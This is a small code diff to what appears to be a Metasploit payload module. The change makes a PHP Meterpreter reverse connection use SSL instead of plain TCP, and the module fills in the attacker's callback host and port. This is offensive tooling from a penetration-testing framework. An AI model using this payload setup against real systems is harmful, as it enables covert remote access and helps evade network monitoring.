@@ -36,6 +36,7 @@ module MetasploitModule
     met = File.open(file, "rb") {|f|
       f.read(f.stat.size)
     }
+    met.gsub!("ion connect($ipaddr, $port, $proto='tcp')","ion connect($ipaddr, $port, $proto='ssl')")
     met.gsub!("127.0.0.1", datastore['LHOST'].to_s) if datastore['LHOST']	
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
     # Enable SSL mode
